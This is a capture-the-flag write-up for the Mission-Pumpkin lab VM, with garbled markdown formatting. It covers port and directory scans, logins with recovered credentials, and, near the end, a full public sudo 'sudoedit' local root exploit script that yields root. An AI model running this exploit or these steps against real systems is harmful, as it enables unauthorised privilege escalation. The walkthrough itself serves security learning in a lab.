\#Enumeration
=============

\#nmap scan
===========

Starting with nmap scanning

Results are given below:

─[root\@parrot]─[/home/user] └──╼ \# nmap -sV -sC -O -A -T4 10.0.2.15
=====================================================================

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-04 08:31 UTC Nmap scan report
for 10.0.2.15 Host is up (0.00085s latency). Not shown: 999 closed ports

PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later \| ftp-anon:
Anonymous FTP login allowed (FTP code 230) \|_-rw-r--r-- 1 0 0 88 Jun 13 00:02
note.txt \| ftp-syst: \| STAT: \| FTP server status: \| Connected to 10.0.2.10
\| Logged in as ftp \| TYPE: ASCII \| No session bandwidth limit \| Session
timeout in seconds is 300 \| Control connection is plain text \| Data
connections will be plain text \| At session startup, client count was 5 \|
vsFTPd 3.0.2 - secure, fast, stable \|*End of status MAC Address:
08:00:27:20:A9:84 (Oracle VirtualBox virtual NIC)*

\#zenmap
--------

Results for zenmap is given below:

**Discovered open port 21/tcp on 10.0.2.15**

**Discovered open port 1515/tcp on 10.0.2.15**

**Discovered open port 3535/tcp on 10.0.2.15**

**Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp
vsftpd 2.0.8 or later \| ftp-anon: Anonymous FTP login allowed (FTP code 230)
\|-rw-r--r-- 1 0 0 88 Jun 13 00:02 note.txt \| ftp-syst: \| STAT: \| FTP server
status: \| Connected to 10.0.2.10 \| Logged in as ftp \| TYPE: ASCII \| No
session bandwidth limit \| Session timeout in seconds is 300 \| Control
connection is plain text \| Data connections will be plain text \| At session
startup, client count was 1 \| vsFTPd 3.0.2 - secure, fast, stable \|**

\*\*End of status 1515/tcp open http Apache httpd 2.4.7 ((Ubuntu)) \|
http-methods: \| Supported Methods: GET HEAD POST OPTIONS \|_http-server-header:
Apache/2.4.7 (Ubuntu) \|http-title: Mission-Pumpkin 3535/tcp\*\*

**open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) \|
ssh-hostkey: \| 1024 d8:8d:e7:48:3a:3c:91:0e:3f:43:ea:a3:05:d8:89:e2 (DSA) \|
2048 f0:41:8f:e0:40:e3:c0:3a:1f:4d:4f:93:e6:63:24:9e (RSA) \| 256
fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1 (ECDSA) \| 256
fa:e8:42:5a:88:91:b4:4b:eb:e4:c3:74:2e:23:a5:45 (ED25519) MAC Address:
08:00:27:20:A9:84 (Oracle VirtualBox virtual NIC) Device type: general purpose
Running: Linux 3.X\|4.X OS CPE: cp**

TRACEROUTE HOP RTT ADDRESS 1 0.73 ms 10.0.2.15

After looking at the results of zenmap, I used dirb for finding important
directories in the website.

Results for dirb scan is given below:

### \#dirb scan

### \#dirb┌─[✗]─[root\@parrot]─[/home/user] └──╼ \#dirb http://10.0.2.15:1515

| DIRB v2.22        |
|-------------------|
| By The Dark Raver |

START_TIME: Thu Jul 4 08:44:46 2019 URL_BASE: http://10.0.2.15:1515/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                                                          GENERATED WORDS: 4612
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

\---- Scanning URL: http://10.0.2.15:1515/ ---- ==\> DIRECTORY:
http://10.0.2.15:1515/img/ +

http://10.0.2.15:1515/index.html (CODE:200\|SIZE:903)  
http://10.0.2.15:1515/server-status (CODE:403\|SIZE:291)

\---- Entering directory: http://10.0.2.15:1515/img/ ---- (!) WARNING: Directory
IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway)

| END_TIME: Thu Jul 4 08:44:50 2019 DOWNLOADED: 4612 - FOUND: 2

Dirb scan gives us some important directories and links to work with. And when I run the first link in browser I found a hidden \_secret folder where I got the clue.txt file. In that file there is a base 64 encrypted string, I decoded that string. It contains the username and password of one of the users. |
|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


\#Exploitation
==============

WE know that ssh port is also open and using dirb we have found the username and
password of one of the user.

Using ssh service on port 3535, Results are given below:

|                        |   |   |   |
|------------------------|---|---|---|
| \#Privilege Escalation |   |   |   |

### ┌─[root\@parrot]─[/home/user] └──╼ \#ssh scarecrow\@10.0.2.15 -p 3535

The authenticity of host '[10.0.2.15]:3535 ([10.0.2.15]:3535)' can't be
established. ECDSA key fingerprint is
SHA256:1zTR0IJtIA7qieJwyAgpvzLuWlRt76GvH2Lir/PJfXs. Are you sure you want to
continue connecting (yes/no)? yes Warning: Permanently added '[10.0.2.15]:3535'
(ECDSA) to the list of known hosts.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          Welcome to Mission-Pumpkin
  All remote connections to this machine are monitored and recorded
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

| scarecrow\@10.0.2.15's password: Last login: Thu Jul 4 00:57:32 2019 from 10.0.2.5 scarecrow\@Pumpkin:\~\$ ls note.txt scarecrow\@Pumpkin:\~\$ cat note.txt          |
|----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! Reach out to goblin and share this "Y0n\$M4sy3D1t" to secretly get keys from LordPumpkin. |

| \#user goblin                                                                                                                                                        |
| [root\@parrot]─[/home/user] └──╼ \#ssh goblin\@10.0.2.15 -p 3535                                                                                                     |

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          Welcome to Mission-Pumpkin
  All remote connections to this machine are monitored and recorded
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

goblin\@10.0.2.15's password: Permission denied, please try again.

goblin\@10.0.2.15's password: Last login: Thu Jul 4 01:29:59 2019 from 10.0.2.5

goblin\@Pumpkin:\~\$ id 
uid=1002(goblin) gid=1002(goblin) groups=1002(goblin),27(sudo)

goblin\@Pumpkin:\~\$ ls note

goblin\@Pumpkin:\~\$ cat note

Hello Friend! I heard that you are looking for PumpkinGarden key. But Key to the
garden will be with LordPumpkin(ROOT user), don't worry, I know where
LordPumpkin had placed the Key. You can reach there through my backyard.

Here is the key to my backyard
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh

\#./38362.sh

!/bin/sh
========

Tod Miller Sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4
==============================================================

local root exploit
==================

March 2010
==========

automated by kingcope
=====================

Full Credits to Slouching
=========================

echo Tod Miller Sudo local root exploit echo by Slouching echo automated by
kingcope if [ \$\# != 1 ] then echo "usage: ./sudoxpl.sh " exit fi cd /tmp cat
\> sudoedit \<\< \_EOF \#!/bin/sh echo ALEX-ALEX su /bin/su /usr/bin/su \_EOF
chmod a+x ./sudoedit sudo ./sudoedit \$1

\#root access
=============

\$ cd /tmp cat \> sudoedit \<\< \_EOF

\#!/bin/sh

echo ALEX-ALEX

su /bin/su /usr/bin/su \_EOF

chmod a+x ./sudoedit

sudo ./sudoedit \$1 \$ \> \> \> \> \> \> \$ \$ ALEX-ALEX

**root\@Pumpkin:/tmp\# id**

**uid=0(root) gid=0(root) groups=0(root)**

root\@Pumpkin:/tmp\# whoami

root

root\@Pumpkin:/tmp\# ls

root\@Pumpkin:/tmp\# pwd

/tmp

root\@Pumpkin:/tmp\# cd ..

root\@Pumpkin:/\# ls

bin etc initrd.img.old lost+found opt run sys var boot home lib media proc sbin
tmp vmlinuz dev initrd.img lib64 mnt root srv usr vmlinuz.old

root\@Pumpkin:/\# cd root

**root\@Pumpkin:\~\# ls**

**PumpkinGarden_Key**

**root\@Pumpkin:\~\# cat PumpkinGarden_Key**

**Q29uZ3JhdHVsYXRpb25zIQ==**

**My Experience: Nice experience while solving this ctf, helped to learn more
about cryptography , gained experience using linux tools for enumeration ,learnt
about shell commands.**

**LEVEL: EASY**
